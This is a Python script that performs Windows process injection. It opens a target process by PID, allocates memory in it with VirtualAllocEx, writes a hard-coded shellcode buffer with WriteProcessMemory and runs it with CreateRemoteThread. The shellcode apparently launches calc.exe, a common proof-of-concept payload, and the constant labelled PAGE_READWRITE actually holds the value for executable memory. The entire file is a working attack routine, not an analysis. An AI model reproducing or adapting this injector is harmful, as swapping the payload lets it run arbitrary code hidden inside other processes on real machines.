from ctypes import *
import sys

PROCESS_ALL_ACCESS = 0x001F0FFF
MEM_COMMIT_RESERVE = ( 0x1000 | 0x2000 )
PAGE_READWRITE     = 0x40
BYTES_WRITTEN      = c_int(0)
THREAD_ID          = c_ulong(0)

PID = int(input("Enter PID to inject into: "))

buf =  ""
buf += "\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b"
buf += "\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7"
buf += "\x4a\x26\x31\xff\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf"
buf += "\x0d\x01\xc7\xe2\xf2\x52\x57\x8b\x52\x10\x8b\x4a\x3c"
buf += "\x8b\x4c\x11\x78\xe3\x48\x01\xd1\x51\x8b\x59\x20\x01"
buf += "\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b\x01\xd6\x31"
buf += "\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03\x7d"
buf += "\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66"
buf += "\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0"
buf += "\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f"
buf += "\x5f\x5a\x8b\x12\xeb\x8d\x5d\x6a\x01\x8d\x85\xb2\x00"
buf += "\x00\x00\x50\x68\x31\x8b\x6f\x87\xff\xd5\xbb\xf0\xb5"
buf += "\xa2\x56\x68\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a"
buf += "\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53"
buf += "\xff\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00"

# Get handle to process
hprocess = windll.kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, PID)
if not hprocess:
    print(WinError())
    sys.exit(0)

# Allocates space for shellcode
baseaddr = windll.kernel32.VirtualAllocEx(hprocess, None, len(buf), MEM_COMMIT_RESERVE, PAGE_READWRITE)
print(WinError())

# Writes shellcode to that memory
windll.kernel32.WriteProcessMemory(hprocess, baseaddr, buf, len(buf), byref(BYTES_WRITTEN))
print(WinError())

# Create remote thread to execute that code
if not windll.kernel32.CreateRemoteThread(hprocess, None, 0, baseaddr, 0, 0, byref(THREAD_ID)):
    print(WinError())
    sys.exit(0)
print("Thread ID: 0x%08x" % THREAD_ID.value)
